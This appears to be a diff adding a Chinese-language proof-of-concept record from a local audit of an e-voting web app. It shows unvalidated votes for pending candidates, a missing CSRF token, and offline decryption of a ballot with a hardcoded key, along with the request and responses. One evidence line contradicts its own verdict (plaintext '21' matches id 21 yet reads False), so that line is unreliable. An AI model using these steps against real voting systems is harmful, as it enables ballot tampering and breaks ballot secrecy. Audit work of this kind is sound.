@@ -1,0 +1,28 @@
+F8 POC: Secured E-Voting System 投票不校验候选人状态/归属（pending 可收票）
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+会话: user_id=35 (otpbrute06@local.test)  选举 id=78880159
+
+== 漏洞要点 ==
+ballot.php:43-47 foreach($_POST['votes'] 直接 INSERT，不校验 candidate_id 是否属于
+该 position/election、是否 status='approved'。自荐（candidate_signup:59 status='pending'）
+候选人可为自身投票；未审核候选人的票直接计入解密计票（fetch_live_data.php:27-35 无状态过滤）。
+
+== 复现步骤与响应 ==
+[0] 基线
+    votes=6 has_voted=0 pending_candidate=21 approved_candidate=17
+[302] POST /election/ballot.php?id=78880159 votes[5]=21（无任何 csrf token）
+    Location=vote_success
+[0] 投票后 has_voted
+    value=1
+[0] (取证) votes 表最新密文
+    ct=Aze26ZT5Xj/XbGVrDRyFiQ==...
+[0] (取证) 用源码硬编码密钥 'ccc@@' 站外解密
+    明文='21'（== 投给 pending 候选人 id=21? False）
+[0] 竞态尝试 ×6：未命中（TOCTOU 窗口存在但未打中）
+    不作为独立声明，仅注记
+[NO-CSRF-CONFIRMED] VERDICT-F7
+    cast_vote 在无 token 下被处理（302→vote_success）
+[NO-VALIDATION-CONFIRMED] VERDICT-F8
+    pending 候选人 id=21 收到有效选票并计入解密计票
+[HARDCODED-KEY-CONFIRMED] VERDICT-F6
+    站外解密成功——选票保密性完全依赖随源码分发的 5 字符密钥
